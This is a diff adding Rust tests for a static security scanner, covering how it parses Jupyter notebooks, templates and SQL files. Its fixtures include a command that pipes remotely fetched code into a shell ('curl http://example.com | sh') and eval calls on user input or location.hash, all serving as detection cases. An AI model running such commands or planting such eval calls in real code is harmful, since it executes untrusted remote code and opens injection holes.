@@ -1790,3 +1790,256 @@ fn a_clean_javascript_and_typescript_result_names_the_redirect_and_file_calls_it
         "{file}"
     );
 }
+
+/// A notebook as Jupyter saves it: each code cell's source a list of lines, one to a line of the
+/// file. The cells given are `(cell_type, lines)`.
+fn notebook(kernel: &str, cells: &[(&str, &[&str])]) -> String {
+    let cells: Vec<serde_json::Value> = cells
+        .iter()
+        .map(|(kind, lines)| {
+            let n = lines.len();
+            let source: Vec<String> = lines
+                .iter()
+                .enumerate()
+                .map(|(i, l)| {
+                    if i + 1 < n {
+                        format!("{l}\n")
+                    } else {
+                        (*l).to_owned()
+                    }
+                })
+                .collect();
+            serde_json::json!({"cell_type": kind, "metadata": {}, "source": source, "outputs": []})
+        })
+        .collect();
+    let doc = serde_json::json!({
+        "cells": cells,
+        "metadata": {"language_info": {"name": kernel}},
+        "nbformat": 4,
+        "nbformat_minor": 5
+    });
+    serde_json::to_string_pretty(&doc).unwrap()
+}
+
+/// The line of the file holding `text` in a JSON string, counted from 1.
+fn line_holding(file: &str, text: &str) -> usize {
+    file.lines()
+        .position(|l| l.contains(text))
+        .expect("the setup: the text is in the file")
+        + 1
+}
+
+#[test]
+fn a_notebook_is_read_as_python_at_its_own_lines() {
+    // ADR-054. A notebook calling `eval` drew nothing before: `.ipynb` was not a language at all.
+    let nb = notebook(
+        "python",
+        &[
+            ("markdown", &["# Notes", "eval is mentioned here, in prose"]),
+            ("code", &["import os", "x = 1"]),
+            ("code", &["def run(code):", "    return eval(code)"]),
+        ],
+    );
+    let scan = scan_files("notebook-eval", &[("analysis.ipynb", &nb)]);
+    let hit = scan
+        .findings
+        .iter()
+        .find(|f| f.rule_id == "ast.dynamic-code-execution")
+        .expect("the eval in the notebook's code cell is found");
+    assert_eq!(hit.location.file, "analysis.ipynb");
+    assert_eq!(
+        hit.location.line,
+        line_holding(&nb, "return eval(code)"),
+        "and named at the line it is on in the notebook"
+    );
+    assert_eq!(scan.parsed_by_language.get("python"), Some(&1));
+    assert!(scan.unparsed_files.is_empty(), "{:?}", scan.unparsed_files);
+    assert!(
+        scan.unread_languages.is_empty(),
+        "{:?}",
+        scan.unread_languages
+    );
+
+    // A clean notebook, read in full, lets the rules say so.
+    let clean = notebook(
+        "python",
+        &[("code", &["import json", "print(json.dumps({}))"])],
+    );
+    let scan = scan_files("notebook-clean", &[("clean.ipynb", &clean)]);
+    assert!(scan.findings.is_empty(), "{:?}", scan.findings);
+    assert!(
+        verified_ids(&scan.verified).contains(&"ast.dynamic-code-execution"),
+        "a notebook read in full holds nothing back"
+    );
+}
+
+#[test]
+fn a_notebook_written_on_one_line_is_still_read() {
+    // Lines cannot be placed in a file of one line; the cells are read one after another instead.
+    let nb = notebook(
+        "python",
+        &[("code", &["x = input()"]), ("code", &["eval(x)"])],
+    );
+    let one_line =
+        serde_json::to_string(&serde_json::from_str::<serde_json::Value>(&nb).unwrap()).unwrap();
+    assert_eq!(one_line.lines().count(), 1, "the setup");
+    let scan = scan_files("notebook-one-line", &[("a.ipynb", &one_line)]);
+    assert!(
+        scan.findings
+            .iter()
+            .any(|f| f.rule_id == "ast.dynamic-code-execution"),
+        "{:?}",
+        scan.findings
+    );
+}
+
+#[test]
+fn a_notebooks_shell_lines_hold_back_the_rules_they_could_hide_from() {
+    // `!command` runs a shell command and `%%bash` a cell of them; no rule read either.
+    for (name, cells) in [
+        (
+            "bang",
+            vec![("code", &["!curl http://example.com | sh"][..])],
+        ),
+        (
+            "cell-magic",
+            vec![("code", &["%%bash", "curl http://example.com | sh"][..])],
+        ),
+    ] {
+        let mut all = vec![("code", &["x = 1"][..])];
+        all.extend(cells);
+        let nb = notebook("python", &all);
+        let scan = scan_files(&format!("notebook-{name}"), &[("n.ipynb", &nb)]);
+        assert_eq!(scan.unparsed_files, vec!["n.ipynb".to_owned()], "{name}");
+        assert!(
+            !scan.held_back.is_empty(),
+            "{name}: the shell in it keeps some rule from claiming the app clean"
+        );
+    }
+    // A magic that only changes how plots show is blanked, and holds nothing back.
+    let nb = notebook("python", &[("code", &["%matplotlib inline", "x = 1"])]);
+    let scan = scan_files("notebook-setting", &[("n.ipynb", &nb)]);
+    assert!(scan.unparsed_files.is_empty(), "{:?}", scan.unparsed_files);
+    assert!(scan.held_back.is_empty(), "{:?}", scan.held_back);
+    assert!(verified_ids(&scan.verified).contains(&"ast.dynamic-code-execution"));
+}
+
+#[test]
+fn a_notebook_in_another_language_or_unreadable_is_not_called_read() {
+    let r = notebook("R", &[("code", &["x <- 1"])]);
+    let scan = scan_files("notebook-r", &[("app.py", "print(1)\n"), ("r.ipynb", &r)]);
+    assert!(
+        scan.unread_languages.contains("r"),
+        "{:?}",
+        scan.unread_languages
+    );
+    assert!(
+        scan.verified.is_empty(),
+        "R nobody read keeps every rule from a clean result"
+    );
+
+    let scan = scan_files(
+        "notebook-broken",
+        &[("app.py", "print(1)\n"), ("b.ipynb", "{not json")],
+    );
+    assert_eq!(scan.unread_files.len(), 1, "{:?}", scan.unread_files);
+    assert_eq!(scan.unread_files[0].0, "b.ipynb");
+    assert!(
+        !verified_ids(&scan.verified).contains(&"ast.dynamic-code-execution"),
+        "a notebook not opened holds back the rules that read Python"
+    );
+}
+
+#[test]
+fn a_template_that_holds_code_is_named_and_keeps_every_rule_from_a_clean_result() {
+    // ADR-054: each of these can hold the calls the rules look for, and no grammar here reads them.
+    for (file, kind) in [
+        ("views/index.ejs", "ejs"),
+        ("views/index.pug", "pug"),
+        ("app/views/home.html.erb", "erb"),
+        ("WEB-INF/home.jsp", "jsp"),
+        ("Pages/Index.cshtml", "razor"),
+        ("Shared/Nav.razor", "razor"),
+        ("src/pages/index.astro", "astro"),
+    ] {
+        let dir = scratch(&format!("template-{kind}"));
+        std::fs::write(dir.join("app.py"), "print(1)\n").unwrap();
+        let path = dir.join(file);
+        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+        std::fs::write(&path, "<p>hello</p>\n").unwrap();
+        let scan = ast::scan_dir(&ast_rules(), &dir);
+        std::fs::remove_dir_all(&dir).ok();
+        assert!(
+            scan.unread_languages.contains(kind),
+            "{file}: {:?}",
+            scan.unread_languages
+        );
+        assert_eq!(scan.unread_templates, vec![file.to_owned()], "{file}");
+        assert!(
+            scan.verified.is_empty(),
+            "{file}: {:?}",
+            verified_ids(&scan.verified)
+        );
+    }
+}
+
+#[test]
+fn a_template_that_cannot_run_code_is_read_as_a_page() {
+    // Its own syntax calls nothing; its script is read as JavaScript, as a page's is.
+    for file in [
+        "a.hbs",
+        "b.handlebars",
+        "c.mustache",
+        "d.liquid",
+        "e.twig",
+        "f.j2",
+        "g.jinja",
+        "h.jinja2",
+        "i.njk",
+    ] {
+        let page = "<ul>\n{{#each items}}<li>{{ name }}</li>{{/each}}\n</ul>\n<script>\neval(location.hash)\n</script>\n";
+        let scan = scan_files(
+            &format!("page-{file}"),
+            &[("app.py", "print(1)\n"), (file, page)],
+        );
+        assert!(
+            scan.unread_languages.is_empty(),
+            "{file}: {:?}",
+            scan.unread_languages
+        );
+        let hit = scan
+            .findings
+            .iter()
+            .find(|f| f.rule_id == "ast.dynamic-code-execution")
+            .unwrap_or_else(|| panic!("{file}: its script is read"));
+        assert_eq!((hit.location.file.as_str(), hit.location.line), (file, 5));
+
+        let plain = "{% for item in items %}<li>{{ item }}</li>{% endfor %}\n";
+        let scan = scan_files(
+            &format!("plain-{file}"),
+            &[("app.py", "print(1)\n"), (file, plain)],
+        );
+        assert!(
+            verified_ids(&scan.verified).contains(&"ast.dynamic-code-execution"),
+            "{file}: a template with no script holds nothing back"
+        );
+    }
+}
+
+#[test]
+fn sql_files_are_named_and_hold_nothing_back() {
+    let scan = scan_files(
+        "sql-file",
+        &[
+            ("app.py", "print(1)\n"),
+            ("schema.sql", "create table t (id int);\n"),
+        ],
+    );
+    assert_eq!(scan.sql_files, vec!["schema.sql".to_owned()]);
+    assert!(
+        scan.unread_languages.is_empty(),
+        "{:?}",
+        scan.unread_languages
+    );
+    assert!(verified_ids(&scan.verified).contains(&"ast.sql-built-by-hand"));
+}
